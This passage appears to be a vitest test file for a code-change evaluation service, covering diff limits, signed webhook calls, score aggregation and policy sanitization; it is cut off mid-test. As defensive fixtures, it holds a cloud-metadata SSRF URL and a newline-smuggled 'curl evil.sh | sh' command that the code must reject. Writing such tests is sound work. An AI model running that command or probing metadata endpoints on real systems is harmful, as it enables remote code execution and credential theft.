import { beforeEach, describe, expect, it, vi } from "vitest";
import { CompositeEvaluator } from "../src/evaluation/composite-evaluator";
import { DiffEvaluator } from "../src/evaluation/diff-evaluator";
import {
  MAX_COMMAND_LENGTH,
  MAX_PHASE_TIMEOUT_MS,
  MAX_TOTAL_BUDGET_MS,
  MIN_PHASE_TIMEOUT_MS,
  MIN_TOTAL_BUDGET_MS,
} from "../src/evaluation/limits";
import { loadPolicy } from "../src/evaluation/policy-loader";
import type { EvalPolicy, Evaluator } from "../src/evaluation/types";
import { WebhookEvaluator } from "../src/evaluation/webhook-evaluator";
import { AppError } from "../src/utils/errors";
import type { Logger } from "../src/utils/logger";

const mockLogger: Logger = {
  trace: vi.fn(),
  debug: vi.fn(),
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
  fatal: vi.fn(),
  child: vi.fn(() => mockLogger),
};

vi.mock("../src/storage/git-ops", () => ({
  readFileFromRepo: vi.fn(),
}));

// Wrap (not replace) the URL validator so individual tests can force edge-case
// return shapes; by default it calls through to the real implementation.
vi.mock("../src/utils/validation", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../src/utils/validation")>();
  return { ...actual, validateWebhookUrl: vi.fn(actual.validateWebhookUrl) };
});

import { readFileFromRepo } from "../src/storage/git-ops";
import { validateWebhookUrl } from "../src/utils/validation";
const mockReadFileFromRepo = vi.mocked(readFileFromRepo);
const mockValidateWebhookUrl = vi.mocked(validateWebhookUrl);

function makeDiff(
  opts: {
    files?: Array<{ path: string; addedLines?: number; removedLines?: number }>;
  } = {},
): string {
  const files = opts.files ?? [{ path: "src/index.ts", addedLines: 3, removedLines: 1 }];
  return files
    .map(({ path, addedLines = 1, removedLines = 0 }) => {
      const added = Array.from({ length: addedLines }, (_, i) => `+line${i + 1}`).join("\n");
      const removed = Array.from({ length: removedLines }, (_, i) => `-old${i + 1}`).join("\n");
      const lines = [
        `diff --git a/${path} b/${path}`,
        `--- a/${path}`,
        `+++ b/${path}`,
        removed,
        added,
      ].filter(Boolean);
      return lines.join("\n");
    })
    .join("\n");
}

function makePolicy(overrides: Partial<EvalPolicy> = {}): EvalPolicy {
  return {
    evaluators: [{ type: "diff" }],
    requireAll: true,
    minScore: 0.7,
    ...overrides,
  };
}

describe("DiffEvaluator", () => {
  const evaluator = new DiffEvaluator();

  it("passes a clean small diff", async () => {
    const diff = makeDiff({ files: [{ path: "src/index.ts", addedLines: 5, removedLines: 2 }] });
    const policy = makePolicy({ evaluators: [{ type: "diff" }] });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(true);
      expect(result.data.score).toBe(1.0);
    }
  });

  it("fails when lines exceed maxLines", async () => {
    const diff = makeDiff({
      files: [{ path: "src/big.ts", addedLines: 600, removedLines: 0 }],
    });
    const policy = makePolicy({ evaluators: [{ type: "diff", maxLines: 500 }], minScore: 1.0 });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.score).toBeLessThan(1.0);
      expect(result.data.issues).toBeDefined();
      expect(result.data.issues?.some((i) => i.includes("maxLines"))).toBe(true);
    }
  });

  it("fails when files exceed maxFiles", async () => {
    const files = Array.from({ length: 25 }, (_, i) => ({
      path: `src/file${i}.ts`,
      addedLines: 1,
    }));
    const diff = makeDiff({ files });
    const policy = makePolicy({ evaluators: [{ type: "diff", maxFiles: 20 }], minScore: 1.0 });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.issues?.some((i) => i.includes("maxFiles"))).toBe(true);
    }
  });

  it("fails when added file matches forbidden pattern", async () => {
    const diff = makeDiff({ files: [{ path: "yarn.lock", addedLines: 2 }] });
    const policy = makePolicy({
      evaluators: [{ type: "diff", forbiddenPatterns: ["*.lock"] }],
      minScore: 1.0,
    });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.issues?.some((i) => i.includes("forbidden"))).toBe(true);
    }
  });

  it("score decrements by 0.25 per violation — 2 violations yields score 0.5", async () => {
    const files = Array.from({ length: 25 }, (_, i) => ({
      path: `src/file${i}.ts`,
      addedLines: 600,
    }));
    const diff = makeDiff({ files });
    const policy = makePolicy({
      evaluators: [{ type: "diff", maxLines: 500, maxFiles: 20 }],
      minScore: 0.3,
    });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.score).toBe(0.5);
      expect(result.data.passed).toBe(true);
    }
  });

  it("fails requiredPatterns when no file matches", async () => {
    const diff = makeDiff({ files: [{ path: "src/index.ts", addedLines: 2 }] });
    const policy = makePolicy({
      evaluators: [{ type: "diff", requiredPatterns: ["tests/*"] }],
      minScore: 1.0,
    });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.issues?.some((i) => i.includes("required pattern"))).toBe(true);
    }
  });

  it("passes requiredPatterns when a file matches", async () => {
    const diff = makeDiff({
      files: [
        { path: "src/index.ts", addedLines: 2 },
        { path: "tests/index.test.ts", addedLines: 1 },
      ],
    });
    const policy = makePolicy({
      evaluators: [{ type: "diff", requiredPatterns: ["tests/*"] }],
    });
    const result = await evaluator.evaluate(diff, policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(true);
    }
  });
});

describe("WebhookEvaluator", () => {
  /**
   * Build the evaluator the way `buildEvaluators` does now: bound to the entry
   * it evaluates (#336), rather than handed a policy to search at evaluation
   * time. Takes the entry from the same policy the test passes in, so tests
   * that vary `secret` or `timeoutMs` still exercise them.
   */
  const webhookFor = (policy: EvalPolicy): WebhookEvaluator => {
    const entry = policy.evaluators.find((e) => e.type === "webhook");
    if (entry?.type !== "webhook") throw new Error("test policy declares no webhook evaluator");
    return new WebhookEvaluator(entry);
  };

  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it("returns result from successful 200 response", async () => {
    const mockResponse = { score: 0.9, passed: true, reason: "Looks good" };
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: async () => mockResponse,
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(true);
      expect(result.data.score).toBe(0.9);
      expect(result.data.reason).toBe("Looks good");
    }
  });

  it("returns failed result on non-2xx", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: false,
        status: 422,
        json: async () => ({}),
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.score).toBe(0);
      expect(result.data.reason).toContain("422");
    }
  });

  it("SEC-6: rejects a private-host URL without fetching (fail-closed)", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "http://169.254.169.254/latest/meta-data" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.score).toBe(0);
      expect(result.data.reason).toMatch(/not allowed/i);
    }
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("SEC-6: passes redirect:manual to fetch and fails a redirect response closed", async () => {
    let capturedInit: RequestInit = {};
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        capturedInit = init;
        // A 3xx followed manually surfaces as an opaque redirect: ok === false.
        return Promise.resolve({ ok: false, status: 302, json: async () => ({}) });
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(capturedInit.redirect).toBe("manual");
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
    }
  });

  it("returns failed result when fetch throws (timeout)", async () => {
    vi.stubGlobal("fetch", vi.fn().mockRejectedValue(new Error("The operation was aborted")));

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval", timeoutMs: 1 }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.message).toContain("The operation was aborted");
    }
  });

  it("adds X-Stratum-Signature header when secret is configured", async () => {
    let capturedHeaders: Record<string, string> = {};
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        capturedHeaders = init.headers as Record<string, string>;
        return Promise.resolve({
          ok: true,
          status: 200,
          json: async () => ({ score: 1.0, passed: true, reason: "ok" }),
        });
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval", secret: "mysecret" }],
    });
    await webhookFor(policy).evaluate("diff content", policy, mockLogger);

    expect(capturedHeaders["X-Stratum-Signature"]).toBeDefined();
    expect(capturedHeaders["X-Stratum-Signature"]).toMatch(/^sha256=[0-9a-f]{64}$/);
  });

  it("#274: sends the base commit the diff was computed against", async () => {
    let capturedBody = "";
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        capturedBody = init.body as string;
        return Promise.resolve({
          ok: true,
          status: 200,
          json: async () => ({ score: 1, passed: true, reason: "ok" }),
        });
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {
      baseSha: "base_abc123",
    });

    const body = JSON.parse(capturedBody);
    expect(body.baseSha).toBe("base_abc123");
    expect(body.diff).toBe("diff content");
  });

  it("#274: omits baseSha rather than guessing when the caller has no base", async () => {
    let capturedBody = "";
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        capturedBody = init.body as string;
        return Promise.resolve({
          ok: true,
          status: 200,
          json: async () => ({ score: 1, passed: true, reason: "ok" }),
        });
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {});

    const body = JSON.parse(capturedBody);
    // Absent, not null and not a stand-in value: a receiver can act on the
    // absence, but cannot be misled by a base that was never verified.
    expect(body).not.toHaveProperty("baseSha");
  });

  it("#274: baseSha is covered by the request signature", async () => {
    const bodies: string[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        bodies.push(init.body as string);
        return Promise.resolve({
          ok: true,
          status: 200,
          json: async () => ({ score: 1, passed: true, reason: "ok" }),
        });
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval", secret: "mysecret" }],
    });
    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {
      baseSha: "base_abc123",
    });
    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {
      baseSha: "base_def456",
    });

    // The signature is computed over the serialized body, so a tampered base
    // cannot be swapped in transit without invalidating it.
    expect(bodies[0]).not.toBe(bodies[1]);
  });

  it("fails closed with a generic reason when URL validation reports no detail", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    mockValidateWebhookUrl.mockReturnValueOnce({ success: false, error: [] });

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.score).toBe(0);
      expect(result.data.reason).toContain("invalid URL");
    }
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  function stubFetchJson(payload: unknown): void {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: async () => payload,
      }),
    );
  }

  async function evaluateWithStub(payload: unknown) {
    stubFetchJson(payload);
    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(true);
    if (!result.success) throw new Error("unreachable");
    return result.data;
  }

  it("SEC: fails closed when `passed` is a truthy string instead of a boolean", async () => {
    const data = await evaluateWithStub({ score: 0.9, passed: "no", reason: "nope" });
    expect(data.passed).toBe(false);
    expect(data.score).toBe(0);
    expect(data.reason).toMatch(/failed closed/i);
  });

  it("fails closed when `score` is not a number", async () => {
    const data = await evaluateWithStub({ score: "0.9", passed: true, reason: "ok" });
    expect(data.passed).toBe(false);
    expect(data.score).toBe(0);
    expect(data.reason).toMatch(/failed closed/i);
  });

  it("fails closed when `score` is not finite", async () => {
    const data = await evaluateWithStub({
      score: Number.POSITIVE_INFINITY,
      passed: true,
      reason: "ok",
    });
    expect(data.passed).toBe(false);
    expect(data.score).toBe(0);
  });

  it("fails closed when verdict fields are missing entirely", async () => {
    const data = await evaluateWithStub({});
    expect(data.passed).toBe(false);
    expect(data.score).toBe(0);
    expect(data.reason).toMatch(/failed closed/i);
  });

  it("fails closed when the response JSON is not an object", async () => {
    const data = await evaluateWithStub(null);
    expect(data.passed).toBe(false);
    expect(data.score).toBe(0);
    expect(data.reason).toMatch(/not an object/i);
  });

  it("fails closed when the response body is not valid JSON", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: async () => {
          throw new SyntaxError("Unexpected token < in JSON");
        },
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
      expect(result.data.score).toBe(0);
      expect(result.data.reason).toMatch(/not valid JSON/i);
    }
  });

  it("clamps an out-of-range score into [0, 1]", async () => {
    const high = await evaluateWithStub({ score: 999, passed: true, reason: "ok" });
    expect(high.score).toBe(1);
    expect(high.passed).toBe(true);

    const low = await evaluateWithStub({ score: -5, passed: false, reason: "bad" });
    expect(low.score).toBe(0);
    expect(low.passed).toBe(false);
  });

  it("defaults `reason` to a string when the response omits it", async () => {
    const data = await evaluateWithStub({ score: 1, passed: true });
    expect(data.passed).toBe(true);
    expect(data.score).toBe(1);
    expect(data.reason).toBe("Webhook returned no reason.");
  });

  it("wraps a non-Error fetch rejection in an ExternalServiceError", async () => {
    vi.stubGlobal("fetch", vi.fn().mockRejectedValue("socket hangup"));

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
    });
    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.message).toContain("socket hangup");
    }
  });

  it("SEC: strips webhook.secret from the outgoing request body", async () => {
    let capturedBody = "";
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        capturedBody = init.body as string;
        return Promise.resolve({
          ok: true,
          status: 200,
          json: async () => ({ score: 1, passed: true, reason: "ok" }),
        });
      }),
    );

    const policy = makePolicy({
      evaluators: [{ type: "webhook", url: "https://example.com/eval", secret: "super-secret" }],
    });
    await webhookFor(policy).evaluate("diff content", policy, mockLogger);

    expect(capturedBody).not.toContain("super-secret");
    expect(capturedBody).not.toContain("secret");
    const payload = JSON.parse(capturedBody) as { diff: string; policy: EvalPolicy };
    expect(payload.diff).toBe("diff content");
    expect(payload.policy.evaluators).toEqual([
      { type: "webhook", url: "https://example.com/eval" },
    ]);
  });

  it("#336: each entry's evaluator posts to its own URL, with its own secret", async () => {
    const calls: Array<{ url: string; signature: string | undefined }> = [];
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((url: string, init: RequestInit) => {
        calls.push({
          url,
          signature: (init.headers as Record<string, string>)["X-Stratum-Signature"],
        });
        return Promise.resolve({
          ok: true,
          status: 200,
          json: async () => ({ score: 1, passed: true, reason: "ok" }),
        });
      }),
    );

    const policy = makePolicy({
      evaluators: [
        { type: "webhook", url: "https://ci-a.example.com/eval", secret: "secret-a" },
        { type: "webhook", url: "https://ci-b.example.com/eval", secret: "secret-b" },
      ],
    });

    // What `buildEvaluators` produces: one instance per entry. Before #336 both
    // instances re-derived their config with a `find`, so both POSTed to ci-a
    // signed with secret-a and ci-b was never contacted at all.
    for (const entry of policy.evaluators) {
      if (entry.type !== "webhook") continue;
      await new WebhookEvaluator(entry).evaluate("diff content", policy, mockLogger);
    }

    expect(calls.map((c) => c.url)).toEqual([
      "https://ci-a.example.com/eval",
      "https://ci-b.example.com/eval",
    ]);
    // Distinct secrets sign distinct HMACs over an otherwise identical body.
    expect(calls[0]?.signature).toMatch(/^sha256=[0-9a-f]{64}$/);
    expect(calls[1]?.signature).toMatch(/^sha256=[0-9a-f]{64}$/);
    expect(calls[0]?.signature).not.toBe(calls[1]?.signature);
  });

  it("#336: uses its own entry's timeoutMs, not the first entry's", async () => {
    const signals: Array<AbortSignal | undefined> = [];
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        signals.push(init.signal ?? undefined);
        // Never settles on its own: the only thing that ends this request is the
        // evaluator's own timer firing on its own entry's budget.
        return new Promise((_resolve, reject) => {
          init.signal?.addEventListener("abort", () => reject(new Error("aborted")));
        });
      }),
    );

    vi.useFakeTimers();
    try {
      const policy = makePolicy({
        evaluators: [
          { type: "webhook", url: "https://ci-a.example.com/eval", timeoutMs: 60000 },
          { type: "webhook", url: "https://ci-b.example.com/eval", timeoutMs: 1000 },
        ],
      });
      const second = policy.evaluators[1];
      if (second?.type !== "webhook") throw new Error("unreachable");

      const pending = new WebhookEvaluator(second).evaluate("diff content", policy, mockLogger);
      await vi.advanceTimersByTimeAsync(1000);
      const result = await pending;

      // Aborted at its own 1s budget. Under the first entry's 60s it would
      // still be in flight here.
      expect(result.success).toBe(false);
      expect(signals[0]?.aborted).toBe(true);
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("CompositeEvaluator", () => {
  function makePassingEvaluator(score = 1.0): Evaluator {
    return {
      evaluate: vi.fn().mockResolvedValue({
        success: true,
        data: {
          score,
          passed: true,
          reason: "passed",
        },
      }),
    };
  }

  function makeFailingEvaluator(score = 0.2): Evaluator {
    return {
      evaluate: vi.fn().mockResolvedValue({
        success: true,
        data: {
          score,
          passed: false,
          reason: "failed",
          issues: ["something went wrong"],
        },
      }),
    };
  }

  it("requireAll=true: fails if any evaluator fails", async () => {
    const composite = new CompositeEvaluator([makePassingEvaluator(), makeFailingEvaluator()]);
    const policy = makePolicy({ requireAll: true });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
    }
  });

  it("requireAll=true: passes when all evaluators pass", async () => {
    const composite = new CompositeEvaluator([makePassingEvaluator(), makePassingEvaluator()]);
    const policy = makePolicy({ requireAll: true });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(true);
    }
  });

  it("requireAll=false: passes if any evaluator passes", async () => {
    const composite = new CompositeEvaluator([makeFailingEvaluator(), makePassingEvaluator()]);
    const policy = makePolicy({ requireAll: false });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(true);
    }
  });

  it("requireAll=false: fails if all evaluators fail", async () => {
    const composite = new CompositeEvaluator([makeFailingEvaluator(), makeFailingEvaluator()]);
    const policy = makePolicy({ requireAll: false });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.passed).toBe(false);
    }
  });

  it("runs all evaluators in parallel (spy on evaluate calls)", async () => {
    const e1 = makePassingEvaluator();
    const e2 = makePassingEvaluator();
    const composite = new CompositeEvaluator([e1, e2]);
    const policy = makePolicy();
    await composite.evaluate("diff", policy, mockLogger);
    expect(e1.evaluate).toHaveBeenCalledOnce();
    expect(e2.evaluate).toHaveBeenCalledOnce();
  });

  it("aggregates scores as average when requireAll=true", async () => {
    const composite = new CompositeEvaluator([
      makePassingEvaluator(0.8),
      makePassingEvaluator(0.6),
    ]);
    const policy = makePolicy({ requireAll: true });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.score).toBeCloseTo(0.7);
    }
  });

  it("aggregates scores as max when requireAll=false", async () => {
    const composite = new CompositeEvaluator([
      makeFailingEvaluator(0.2),
      makePassingEvaluator(0.9),
    ]);
    const policy = makePolicy({ requireAll: false });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.score).toBe(0.9);
    }
  });

  it("collects issues from all evaluators", async () => {
    const e1: Evaluator = {
      evaluate: vi.fn().mockResolvedValue({
        success: true,
        data: {
          score: 0.5,
          passed: false,
          reason: "fail1",
          issues: ["issue A"],
        },
      }),
    };
    const e2: Evaluator = {
      evaluate: vi.fn().mockResolvedValue({
        success: true,
        data: {
          score: 0.5,
          passed: false,
          reason: "fail2",
          issues: ["issue B"],
        },
      }),
    };
    const composite = new CompositeEvaluator([e1, e2]);
    const policy = makePolicy({ requireAll: true });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.issues).toContain("issue A");
      expect(result.data.issues).toContain("issue B");
    }
  });

  it('reason is "All evaluators passed." when all pass', async () => {
    const composite = new CompositeEvaluator([makePassingEvaluator(), makePassingEvaluator()]);
    const policy = makePolicy({ requireAll: true });
    const result = await composite.evaluateAndAggregate("diff", policy, mockLogger);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.reason).toBe("All evaluators passed.");
    }
  });
});

describe("loadPolicy", () => {
  beforeEach(() => {
    mockReadFileFromRepo.mockReset();
  });

  it("returns DEFAULT_POLICY when readFileFromRepo returns null", async () => {
    mockReadFileFromRepo.mockResolvedValue({
      success: true,
      data: null as unknown as string,
    });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.evaluators).toEqual([{ type: "diff" }]);
    expect(policy.requireAll).toBe(true);
    expect(policy.minScore).toBe(0.7);
  });

  it("parses valid stratum.config.json", async () => {
    const config = {
      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
      requireAll: false,
      minScore: 0.5,
    };
    mockReadFileFromRepo
      .mockResolvedValueOnce({
        success: false,
        error: new AppError("missing yaml", "NOT_FOUND", 404),
      })
      .mockResolvedValueOnce({
        success: true,
        data: JSON.stringify(config),
      });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.requireAll).toBe(false);
    expect(policy.minScore).toBe(0.5);
    expect(policy.evaluators[0]?.type).toBe("webhook");
  });

  it("merges parsed config with defaults", async () => {
    const config = { evaluators: [{ type: "diff", maxLines: 100 }] };
    mockReadFileFromRepo
      .mockResolvedValueOnce({
        success: false,
        error: new AppError("missing yaml", "NOT_FOUND", 404),
      })
      .mockResolvedValueOnce({
        success: true,
        data: JSON.stringify(config),
      });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.requireAll).toBe(true);
    expect(policy.minScore).toBe(0.7);
    expect(policy.evaluators[0]).toMatchObject({ type: "diff", maxLines: 100 });
  });

  it("fails closed (configError) on a present-but-invalid JSON policy", async () => {
    mockReadFileFromRepo
      .mockResolvedValueOnce({
        success: false,
        error: new AppError("missing yaml", "NOT_FOUND", 404),
      })
      .mockResolvedValueOnce({
        success: true,
        data: "not { valid json",
      });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    // Evaluators still default so the change flow works, but the merge gate is
    // marked failed-closed rather than silently downgraded.
    expect(policy.evaluators).toEqual([{ type: "diff" }]);
    expect(policy.configError).toMatch(/invalid/i);
  });

  it("does NOT set configError when the policy file is simply absent", async () => {
    mockReadFileFromRepo.mockResolvedValue({
      success: false,
      error: new AppError("missing", "NOT_FOUND", 404),
    });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.configError).toBeUndefined();
  });

  it("fails closed when a present policy is missing 'evaluators'", async () => {
    mockReadFileFromRepo
      .mockResolvedValueOnce({
        success: false,
        error: new AppError("missing yaml", "NOT_FOUND", 404),
      })
      .mockResolvedValueOnce({
        success: true,
        data: JSON.stringify({ minScore: 0.5 }),
      });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.evaluators).toEqual([{ type: "diff" }]);
    expect(policy.configError).toBeDefined();
  });

  it("returns DEFAULT_POLICY when readFileFromRepo throws", async () => {
    mockReadFileFromRepo.mockResolvedValue({
      success: false,
      error: new AppError("Network error", "NETWORK_ERROR", 500),
    });
    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.evaluators).toEqual([{ type: "diff" }]);
  });

  it("parses .stratum/policy.yaml before stratum.config.json", async () => {
    mockReadFileFromRepo.mockImplementation(async (_remote, _token, _path, _logger) => {
      if (_path === ".stratum/policy.yaml") {
        return {
          success: true,
          data: [
            "evaluators:",
            "  - type: diff",
            "    maxLines: 42",
            "requireAll: false",
            "minScore: 0.4",
          ].join("\n"),
        };
      }
      return {
        success: true,
        data: JSON.stringify({
          evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
        }),
      };
    });

    const policy = await loadPolicy("https://repo.example.com", "tok", mockLogger);
    expect(policy.requireAll).toBe(false);
    expect(policy.minScore).toBe(0.4);
    expect(policy.evaluators[0]).toMatchObject({ type: "diff", maxLines: 42 });
    expect(mockReadFileFromRepo).toHaveBeenCalledTimes(1);
  });
});

describe("loadPolicy — evaluator sanitization", () => {
  beforeEach(() => {
    mockReadFileFromRepo.mockReset();
  });

  /** Loads `config` as the YAML policy file. */
  async function loadConfig(config: unknown): Promise<EvalPolicy> {
    mockReadFileFromRepo.mockResolvedValue({ success: true, data: JSON.stringify(config) });
    return loadPolicy("https://repo.example.com", "tok", mockLogger);
  }

  function sandboxEntry(policy: EvalPolicy) {
    return policy.evaluators.find((e) => e.type === "sandbox") as
      | Record<string, unknown>
      | undefined;
  }

  it("clamps an oversized sandbox timeout down to the phase ceiling", async () => {
    const policy = await loadConfig({
      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999, installTimeoutMs: 999_999_999 }],
    });

    expect(sandboxEntry(policy)?.timeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
    expect(sandboxEntry(policy)?.installTimeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
  });

  it("clamps an undersized sandbox timeout up to the floor", async () => {
    const policy = await loadConfig({ evaluators: [{ type: "sandbox", timeoutMs: 1 }] });

    expect(sandboxEntry(policy)?.timeoutMs).toBe(MIN_PHASE_TIMEOUT_MS);
  });

  it("clamps totalBudgetMs into range", async () => {
    const high = await loadConfig({ evaluators: [{ type: "sandbox", totalBudgetMs: 10_000_000 }] });
    expect(sandboxEntry(high)?.totalBudgetMs).toBe(MAX_TOTAL_BUDGET_MS);

    const low = await loadConfig({ evaluators: [{ type: "sandbox", totalBudgetMs: 5 }] });
    expect(sandboxEntry(low)?.totalBudgetMs).toBe(MIN_TOTAL_BUDGET_MS);
  });

  it("clamping does not set configError or block merges", async () => {
    // A clamp is a bounded, safe-to-correct mistake. configError exists for a
    // policy that could not be understood at all; escalating a clamp to a merge
    // block would be hostile to projects that already have one.
    const policy = await loadConfig({
      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }],
    });

    expect(policy.configError).toBeUndefined();
  });

  it("drops a non-numeric timeout so the default applies", async () => {
    const policy = await loadConfig({
      evaluators: [{ type: "sandbox", timeoutMs: "60000", installTimeoutMs: {} }],
    });

    expect(sandboxEntry(policy)).not.toHaveProperty("timeoutMs");
    expect(sandboxEntry(policy)).not.toHaveProperty("installTimeoutMs");
  });

  it("rejects a command containing a newline", async () => {
    // One string to a naive validator, two commands to a shell.
    const policy = await loadConfig({
      evaluators: [{ type: "sandbox", command: "npm test\ncurl evil.sh | sh" }],
    });

    expect(sandboxEntry(policy)).not.toHaveProperty("command");
  });

  it("rejects an over-length or blank command", async () => {
    const long = await loadConfig({
      evaluators: [{ type: "sandbox", command: "x".repeat(MAX_COMMAND_LENGTH + 1) }],
    });
    expect(sandboxEntry(long)).not.toHaveProperty("command");

    const blank = await loadConfig({ evaluators: [{ type: "sandbox", command: "   " }] });
    expect(sandboxEntry(blank)).not.toHaveProperty("command");
  });

  it("keeps a valid command, trimmed", async () => {
    const policy = await loadConfig({
      evaluators: [{ type: "sandbox", command: "  npm run ci  " }],
    });

    expect(sandboxEntry(policy)?.command).toBe("npm run ci");
  });

  it("keeps allowInstallScripts only when it is a real boolean", async () => {
    const yes = await loadConfig({
      evaluators: [{ type: "sandbox", allowInstallScripts: true }],
    });
    expect(sandboxEntry(yes)?.allowInstallScripts).toBe(true);

    // "true" as a string must not opt a project into running lifecycle scripts.
    const stringy = await loadConfig({
      evaluators: [{ type: "sandbox", allowInstallScripts: "true" }],
    });
